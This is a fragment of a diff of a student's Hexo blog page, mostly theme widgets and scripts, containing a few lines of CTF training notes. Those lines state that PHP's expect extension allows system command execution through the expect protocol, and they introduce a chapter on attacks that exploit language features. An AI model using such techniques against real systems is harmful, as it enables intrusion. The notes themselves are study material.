Yang</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Sichuan University</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">Posts</p><a href="/archives"><p class="title">46</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Categories</p><a href="/categories"><p class="title">7</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Tags</p><a href="/tags"><p class="title">6</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/deng12yx" target="_blank" rel="me noopener">Follow</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Github" href="https://github.com/ppoffice"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Dribbble" href="https://dribbble.com"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="RSS" href="/"><i class="fas fa-rss"></i></a></div></div></div><!--!--><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">Links</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://github.com/deng12yx" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Github</span></span><span class="level-right"><span class="level-item tag">github.com</span></span></a></li><li><a class="level is-mobile" href="https://bulma.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Bulma</span></span><span class="level-right"><span class="level-item tag">bulma.io</span></span></a></li></ul></div></div></div><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">Categories</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/JNDI/"><span class="level-start"><span class="level-item">JNDI</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/RMI/"><span class="level-start"><span class="level-item">RMI</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/ctf/"><span class="level-start"><span class="level-item">ctf</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/%E5%A4%8D%E6%9D%82%E7%BD%91%E7%BB%9C/"><span class="level-start"><span class="level-item">复杂网络</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/categories/%E5%AE%89%E5%85%A8/"><span class="level-start"><span class="level-item">安全</span></span><span class="level-end"><span class="level-item tag">15</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"><span class="level-start"><span class="level-item">数据结构</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"><span class="level-start"><span class="level-item">深度学习</span></span><span class="level-end"><span class="level-item tag">16</span></span></a></li></ul></div></div></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">Recents</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-10-05T10:08:19.343Z">2024-10-05</time></p><p class="title"><a href="/post/4a17b156.html">Hello World</a></p></div></article><article class="media"><figure class="media-left"><a class="image" href="/post/7684f23b.html"><img src="/img/article/15.png" alt="T2I"></a></figure><div class="media-content"><p class="date"><time dateTime="2024-09-23T06:17:27.000Z">2024-09-23</time></p><p class="title"><a href="/post/7684f23b.html">T2I</a></p><p class="categories"><a href="/categories/%E5%AE%89%E5%85%A8/">安全</a></p></div></article><article class="media"><figure class="media-left"><a class="image" href="/post/e4cc0182.html"><img src="/img/article/14.png" alt="Explainable_ML"></a></figure><div class="media-content"><p class="date"><time dateTime="2024-09-23T06:15:08.000Z">2024-09-23</time></p><p class="title"><a href="/post/e4cc0182.html">Explainable_ML</a></p><p class="categories"><a href="/categories/%E5%AE%89%E5%85%A8/">安全</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-08-18T02:04:22.000Z">2024-08-18</time></p><p class="title"><a href="/post/374aa791.html">leetcode-daily-practice</a></p><p class="categories"><a href="/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/">数据结构</a></p></div></article><article class="media"><figure class="media-left"><a class="image" href="/post/cda691ed.html"><img src="/img/article/13.png" alt="FGSM &amp; PDG"></a></figure><div class="media-content"><p class="date"><time dateTime="2024-07-02T08:20:29.000Z">2024-07-02</time></p><p class="title"><a href="/post/cda691ed.html">FGSM &amp; PDG</a></p><p class="categories"><a href="/categories/%E5%AE%89%E5%85%A8/">安全</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">Archives</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2024/10/"><span class="level-start"><span class="level-item">October 2024</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/09/"><span class="level-start"><span class="level-item">September 2024</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/08/"><span class="level-start"><span class="level-item">August 2024</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/07/"><span class="level-start"><span class="level-item">July 2024</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/06/"><span class="level-start"><span class="level-item">June 2024</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/03/"><span class="level-start"><span class="level-item">March 2024</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/02/"><span class="level-start"><span class="level-item">February 2024</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/12/"><span class="level-start"><span class="level-item">December 2023</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/09/"><span class="level-start"><span class="level-item">September 2023</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/08/"><span class="level-start"><span class="level-item">August 2023</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/07/"><span class="level-start"><span class="level-item">July 2023</span></span><span class="level-end"><span class="level-item tag">21</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">Tags</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/Python/"><span class="tag">Python</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/c/"><span class="tag">c</span><span class="tag">6</span></a></div><div class="control"><a class="tags has-addons" href="/tags/c/"><span class="tag">c++</span><span class="tag">6</span></a></div><div class="control"><a class="tags has-addons" href="/tags/java/"><span class="tag">java</span><span class="tag">7</span></a></div><div class="control"><a class="tags has-addons" href="/tags/php/"><span class="tag">php</span><span class="tag">6</span></a></div><div class="control"><a class="tags has-addons" href="/tags/python/"><span class="tag">python</span><span class="tag">20</span></a></div></div></div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">Subscribe for updates</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="Subscribe"></div></div></form></div></div></div><div class="card widget"><div class="card-content"><div class="notification is-danger">You need to set <code>client_id</code> and <code>slot_id</code> to show this AD unit. Please set it in <code>_config.yml</code>.</div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">follow.it</h3><form action="" method="post" target="_blank"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="Subscribe"></div></div></form></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/">BeautyFlower</a><p class="is-size-7"><span>&copy; 2024 yyyyyyxnp</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a><br><span id="busuanzi_container_site_uv">Visited by <span id="busuanzi_value_site_uv">0</span> users</span></p><p class="is-size-7">© 2019</p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/deng12yx"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
+<h4 id="命令执行">命令执行</h4>
+<p>php环境如果安装了except扩展，可通过except协议执行系统命令</p>
+<h2 id="第五章-利用特性进行攻击">第五章 利用特性进行攻击</h2>
+</div><div class="article-licensing box"><div class="licensing-title"><p>ctf特训营笔记</p><p><a href="http://example.com/post/392e8386.html">http://example.com/post/392e8386.html</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>yyyyyyxnp</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2023-07-31</p></div></div><div class="level-item is-narrow"><div><h6>Updated on</h6><p>2024-09-29</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="notification is-danger">You need to set <code>install_url</code> to use ShareThis. Please set it in <code>_config.yml</code>.</div></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">Like this article? Support the author with</h3><div class="buttons is-centered"><a class="button donate" href="/" target="_blank" rel="noopener" data-type="afdian"><span class="icon is-small"><i class="fas fa-charging-station"></i></span><span>Afdian.net</span></a><a class="button donate" data-type="alipay"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>Alipay</span><span class="qrcode"><img src="/" alt="Alipay"></span></a><a class="button donate" href="/" target="_blank" rel="noopener" data-type="buymeacoffee"><span class="icon is-small"><i class="fas fa-coffee"></i></span><span>Buy me a coffee</span></a><a class="button donate" href="/" target="_blank" rel="noopener" data-type="patreon"><span class="icon is-small"><i class="fab fa-patreon"></i></span><span>Patreon</span></a><div class="notification is-danger">You forgot to set the <code>business</code> or <code>currency_code</code> for Paypal. Please set it in <code>_config.yml</code>.</div><a class="button donate" data-type="wechat"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>Wechat</span><span class="qrcode"><img src="/" alt="Wechat"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/post/266d9ac.html"><i class="level-item fas fa-chevron-left"></i><span class="level-item">leetcode100题_2</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/post/b4fd5249.html"><span class="level-item">菜鸟的ctf之旅(ctfhub技能树)</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">Comments</h3><div class="notification is-danger">You forgot to set the <code>shortname</code> for Disqus. Please set it in <code>_config.yml</code>.</div></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/img/avatar.png" alt="Yyyyyyxnp"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">Yyyyyyxnp</p><p class="is-size-6 is-block">Student Yang</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Sichuan University</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">Posts</p><a href="/archives"><p class="title">46</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Categories</p><a href="/categories"><p class="title">7</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Tags</p><a href="/tags"><p class="title">6</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/deng12yx" target="_blank" rel="me noopener">Follow</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Github" href="https://github.com/ppoffice"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Dribbble" href="https://dribbble.com"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="RSS" href="/"><i class="fas fa-rss"></i></a></div></div></div><!--!--><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">Links</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://github.com/deng12yx" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Github</span></span><span class="level-right"><span class="level-item tag">github.com</span></span></a></li><li><a class="level is-mobile" href="https://bulma.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Bulma</span></span><span class="level-right"><span class="level-item tag">bulma.io</span></span></a></li></ul></div></div></div><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">Categories</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/JNDI/"><span class="level-start"><span class="level-item">JNDI</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/RMI/"><span class="level-start"><span class="level-item">RMI</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/ctf/"><span class="level-start"><span class="level-item">ctf</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/%E5%A4%8D%E6%9D%82%E7%BD%91%E7%BB%9C/"><span class="level-start"><span class="level-item">复杂网络</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/categories/%E5%AE%89%E5%85%A8/"><span class="level-start"><span class="level-item">安全</span></span><span class="level-end"><span class="level-item tag">15</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"><span class="level-start"><span class="level-item">数据结构</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"><span class="level-start"><span class="level-item">深度学习</span></span><span class="level-end"><span class="level-item tag">16</span></span></a></li></ul></div></div></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">Recents</h3><article class="media"><figure class="media-left"><a class="image" href="/post/9c1a1a1.html"><img src="/img/article/17.png" alt="luogu_1"></a></figure><div class="media-content"><p class="date"><time dateTime="2024-10-08T10:50:27.000Z">2024-10-08</time></p><p class="title"><a href="/post/9c1a1a1.html">luogu_1</a></p><p class="categories"><a href="/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/">数据结构</a></p></div></article><article class="media"><figure class="media-left"><a class="image" href="/post/7684f23b.html"><img src="/img/article/15.png" alt="T2I"></a></figure><div class="media-content"><p class="date"><time dateTime="2024-09-23T06:17:27.000Z">2024-09-23</time></p><p class="title"><a href="/post/7684f23b.html">T2I</a></p><p class="categories"><a href="/categories/%E5%AE%89%E5%85%A8/">安全</a></p></div></article><article class="media"><figure class="media-left"><a class="image" href="/post/e4cc0182.html"><img src="/img/article/16.png" alt="Explainable_ML"></a></figure><div class="media-content"><p class="date"><time dateTime="2024-09-23T06:15:08.000Z">2024-09-23</time></p><p class="title"><a href="/post/e4cc0182.html">Explainable_ML</a></p><p class="categories"><a href="/categories/%E5%AE%89%E5%85%A8/">安全</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-08-18T02:04:22.000Z">2024-08-18</time></p><p class="title"><a href="/post/374aa791.html">leetcode-daily-practice</a></p><p class="categories"><a href="/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/">数据结构</a></p></div></article><article class="media"><figure class="media-left"><a class="image" href="/post/cda691ed.html"><img src="/img/article/13.png" alt="FGSM &amp; PDG"></a></figure><div class="media-content"><p class="date"><time dateTime="2024-07-02T08:20:29.000Z">2024-07-02</time></p><p class="title"><a href="/post/cda691ed.html">FGSM &amp; PDG</a></p><p class="categories"><a href="/categories/%E5%AE%89%E5%85%A8/">安全</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">Archives</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2024/10/"><span class="level-start"><span class="level-item">October 2024</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/09/"><span class="level-start"><span class="level-item">September 2024</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/08/"><span class="level-start"><span class="level-item">August 2024</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/07/"><span class="level-start"><span class="level-item">July 2024</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/06/"><span class="level-start"><span class="level-item">June 2024</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/03/"><span class="level-start"><span class="level-item">March 2024</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/02/"><span class="level-start"><span class="level-item">February 2024</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/12/"><span class="level-start"><span class="level-item">December 2023</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/09/"><span class="level-start"><span class="level-item">September 2023</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/08/"><span class="level-start"><span class="level-item">August 2023</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/07/"><span class="level-start"><span class="level-item">July 2023</span></span><span class="level-end"><span class="level-item tag">21</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">Tags</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/Python/"><span class="tag">Python</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/c/"><span class="tag">c</span><span class="tag">7</span></a></div><div class="control"><a class="tags has-addons" href="/tags/c/"><span class="tag">c++</span><span class="tag">7</span></a></div><div class="control"><a class="tags has-addons" href="/tags/java/"><span class="tag">java</span><span class="tag">7</span></a></div><div class="control"><a class="tags has-addons" href="/tags/php/"><span class="tag">php</span><span class="tag">6</span></a></div><div class="control"><a class="tags has-addons" href="/tags/python/"><span class="tag">python</span><span class="tag">20</span></a></div></div></div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">Subscribe for updates</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="Subscribe"></div></div></form></div></div></div><div class="card widget"><div class="card-content"><div class="notification is-danger">You need to set <code>client_id</code> and <code>slot_id</code> to show this AD unit. Please set it in <code>_config.yml</code>.</div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">follow.it</h3><form action="" method="post" target="_blank"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="Subscribe"></div></div></form></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/">BeautyFlower</a><p class="is-size-7"><span>&copy; 2024 yyyyyyxnp</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a><br><span id="busuanzi_container_site_uv">Visited by <span id="busuanzi_value_site_uv">0</span> users</span></p><p class="is-size-7">© 2019</p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/deng12yx"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
             article: {
                 highlight: {
                     clipboard: true,
@@ -527,6 +629,16 @@
                 }
                 $('.justified-gallery').justifiedGallery();
             }
-        });</script><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script src="/js/pjax.js"></script><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
+        });</script><!--!--><!--!--><script type="text/javascript" id="MathJax-script" async>MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      },
+      svg: {
+        fontCache: 'global'
+      },
+      chtml: {
+        matchFontHeight: false
+      }
+    };</script><script src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script src="/js/pjax.js"></script><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
             loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
         });</script></body></html>
